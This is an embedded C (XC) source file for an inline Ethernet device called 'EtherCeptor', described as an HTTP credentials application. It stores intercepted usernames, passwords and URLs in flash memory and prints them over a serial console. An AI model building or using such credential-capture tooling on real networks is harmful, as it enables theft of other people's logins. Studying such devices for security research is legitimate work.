#include <platform.h>
#include <string.h>
#include <stdio.h>
#include <quadflashlib.h>
#include "serial.h"
#include "datalog.h"


fl_QSPIPorts ports = {
    PORT_SQI_CS,
    PORT_SQI_SCLK,
    PORT_SQI_SIO,
    on tile[0]: XS1_CLKBLK_3
};

fl_QuadDeviceSpec deviceSpecs[] =
{
    FL_QUADDEVICE_SPANSION_S25FL116K,
    FL_QUADDEVICE_SPANSION_S25FL132K,
    FL_QUADDEVICE_SPANSION_S25FL164K,
    FL_QUADDEVICE_ISSI_IS25LQ080B,
    FL_QUADDEVICE_ISSI_IS25LQ016B,
    FL_QUADDEVICE_ISSI_IS25LQ032B,
};

void read_log(struct info_log *logPtr);
void write_log(struct info_log *logPtr);
unsigned log_crc(struct info_log *logPtr);
void serial_write_str(client uart_tx_buffered_if uart_tx, uint8_t str[]);
void serial_write_buf(client uart_tx_buffered_if uart_tx, uint8_t buf[], size_t buf_size);
void serial_write_byte(client uart_tx_buffered_if uart_tx, uint8_t byte);
void handle_command(uint8_t cmd[], client uart_tx_buffered_if uart_tx, client interface stats_if stats[2]);

struct info_log log;

void serial_handler(client uart_tx_buffered_if uart_tx, client uart_rx_if uart_rx, client interface stats_if stats[2], server interface info_log_if log_if[2])
{
  uint8_t welcome[]   = "\r\nEtherCeptor - HTTP Credentials Application\r\nType /? to see available commands\r\n";
  uint8_t error_ovf[] = "\r\nUART Receive Command Overflow\r\n";
  uint8_t rx_buf[UART_RX_LINE_BUF_SIZE];
  unsigned rx_ptr = 0;



  read_log(&log);
  unsigned crc32 = log_crc(&log);
  if (log.crc32 != crc32)
  {
      for (int i = 0; i < NR_INFO_LOG_ENTRIES; i++)
      {
          log.entries[i].valid = 0;
      }
      log.crc32 = log_crc(&log);
      write_log(&log);
  }

  serial_write_str(uart_tx, welcome);

  while (1)
  {
      select {
          case uart_rx.data_ready():
              rx_buf[rx_ptr] = uart_rx.read();
              serial_write_byte(uart_tx, rx_buf[rx_ptr]);

              if (rx_ptr >= 1 && rx_buf[rx_ptr-1] == '\r' && rx_buf[rx_ptr] == '\n')
              {
                  rx_buf[rx_ptr + 1] = '\0';
                  handle_command(rx_buf, uart_tx, stats);
                  rx_ptr = 0;
              }
              else if (rx_ptr >= UART_RX_LINE_BUF_SIZE - 2)
              {
                  serial_write_str(uart_tx, error_ovf);
                  rx_ptr = 0;
              }
              else
              {
                  rx_ptr++;
              }
              break;
          case log_if[int i].add_entry(char username[INFO_LOG_ENTRY_FIELD_LEN], char password[INFO_LOG_ENTRY_FIELD_LEN], char url[INFO_LOG_ENTRY_FIELD_LEN]):
              char buf[128];
              //char u[INFO_LOG_ENTRY_FIELD_LEN];
              //char p[INFO_LOG_ENTRY_FIELD_LEN];
              //char link[INFO_LOG_ENTRY_FIELD_LEN];
              //memcpy(u, username, INFO_LOG_ENTRY_FIELD_LEN);
              //memcpy(p, password, INFO_LOG_ENTRY_FIELD_LEN);
              //memcpy(link, url, INFO_LOG_ENTRY_FIELD_LEN);
              //snprintf(buf, 128, "new entry: url: %s user: %s pw: %s\r\n", link, u, p);
              //serial_write_str(uart_tx, buf);

              int j = 0;

              while (j<NR_INFO_LOG_ENTRIES)
              {
                  if (log.entries[j].valid == 0)
                  {
                      log.entries[j].valid = 1;
                      memcpy(log.entries[j].username, username, INFO_LOG_ENTRY_FIELD_LEN);
                      memcpy(log.entries[j].password, password, INFO_LOG_ENTRY_FIELD_LEN);
                      memcpy(log.entries[j].url, url, INFO_LOG_ENTRY_FIELD_LEN);
                      unsigned newcrc32 = log_crc(&log);
                      log.crc32 = newcrc32;
                      write_log(&log);
                      break;
                  }
                  j++;
              }

              if (j==NR_INFO_LOG_ENTRIES)
              {
                  serial_write_str(uart_tx, "Log memory full\r\n");
              }
              break;
      }

  }
}

void handle_command(uint8_t cmd[], client uart_tx_buffered_if uart_tx, client interface stats_if stats[2])
{
    if (strcmp(cmd, "/?\r\n") == 0)
    {
        serial_write_str(uart_tx, "Commands:\r\n");
        serial_write_str(uart_tx, "  /?                 - show available commands\r\n");
        serial_write_str(uart_tx, "  /get stat eth1     - eth1 rx/tx packet counters\r\n");
        serial_write_str(uart_tx, "  /get stat eth2     - eth2 rx/tx packet counters\r\n");
        serial_write_str(uart_tx, "  /reset stats       - reset packet counters\r\n");
        serial_write_str(uart_tx, "  /get log           - print captured credentials\r\n");
        serial_write_str(uart_tx, "  /reset log         - clear captured credentials\r\n");
    }
    else if (strcmp(cmd, "/get stat eth1\r\n") == 0)
    {
        unsigned rx_total = stats[0].rx_total();
        unsigned tx_total = stats[1].tx_total();
        uint8_t pbuf[64];
        snprintf(pbuf, 64, "eth1 rx_total: %u tx_total: %u\r\n", rx_total, tx_total);
        serial_write_str(uart_tx, pbuf);
    }
    else if (strcmp(cmd, "/get stat eth2\r\n") == 0)
    {
        unsigned rx_total = stats[1].rx_total();
        unsigned tx_total = stats[0].tx_total();
        uint8_t pbuf[64];
        snprintf(pbuf, 64, "eth2 rx_total: %u tx_total: %u\r\n", rx_total, tx_total);
        serial_write_str(uart_tx, pbuf);
    }
    else if (strcmp(cmd, "/reset stats\r\n") == 0)
    {
        stats[0].reset();
        stats[1].reset();
        serial_write_str(uart_tx, "statistics reset\r\n");
    }
    else if (strcmp(cmd, "/get log\r\n") == 0)
    {
        int printed = 0;
        for (int i = 0; i < NR_INFO_LOG_ENTRIES; i++)
        {
            if (log.entries[i].valid != 0)
            {
                char pbuf[128];
                snprintf(pbuf, 128, "[%d] url: %s username: %s password: %s\r\n", i, log.entries[i].url, log.entries[i].username, log.entries[i].password);
                serial_write_str(uart_tx, pbuf);
                printed++;
            }
        }

        if (printed==0)
        {
            serial_write_str(uart_tx, "No log entries!\r\n");
        }
    }
    else if (strcmp(cmd, "/reset log\r\n") == 0)
    {
        for (int i = 0; i < NR_INFO_LOG_ENTRIES; i++)
        {
            log.entries[i].valid = 0;
        }
        unsigned newcrc32 = log_crc(&log);
        log.crc32 = newcrc32;
        write_log(&log);
    }
    else
    {
        serial_write_str(uart_tx, "Invalid command, type '/?' to see available commands\r\n");
    }
}

void serial_write_byte(client uart_tx_buffered_if uart_tx, uint8_t byte)
{
    while (uart_tx.get_available_buffer_size() < 1)
        ;
    uart_tx.write(byte);
}

void serial_write_str(client uart_tx_buffered_if uart_tx, uint8_t str[])
{
    size_t len = strlen(str);

    while (uart_tx.get_available_buffer_size() < len)
        ;

    for (size_t i = 0; i < len; i++)
    {
        uart_tx.write(str[i]);
    }
}

void serial_write_buf(client uart_tx_buffered_if uart_tx, uint8_t buf[], size_t buf_size)
{
    while (uart_tx.get_available_buffer_size() < buf_size)
        ;

    for (size_t i = 0; i < buf_size; i++)
    {
        uart_tx.write(buf[i]);
    }
}

void read_log(struct info_log *logPtr)
{
    fl_connectToDevice(ports, deviceSpecs, sizeof(deviceSpecs)/sizeof(fl_QuadDeviceSpec));
    fl_readData(0, sizeof(struct info_log), (char *)logPtr);
    fl_disconnect();
}

void write_log(struct info_log *logPtr)
{
    unsigned char buf [16384];
    fl_connectToDevice(ports, deviceSpecs, sizeof(deviceSpecs)/sizeof(fl_QuadDeviceSpec));
    fl_writeData(0, sizeof(struct info_log), (char *)logPtr, buf);
    fl_disconnect();
}

unsigned log_crc(struct info_log *logPtr)
{
    unsigned *log = (unsigned *)logPtr;
    unsigned checksum = 0xFFFFFFFF;
    for (int i=0; i<(sizeof(struct info_log)/4)-1; i++)
    {
        crc32(checksum, log[i], 0xEDB88320);
    }

    return checksum;
}
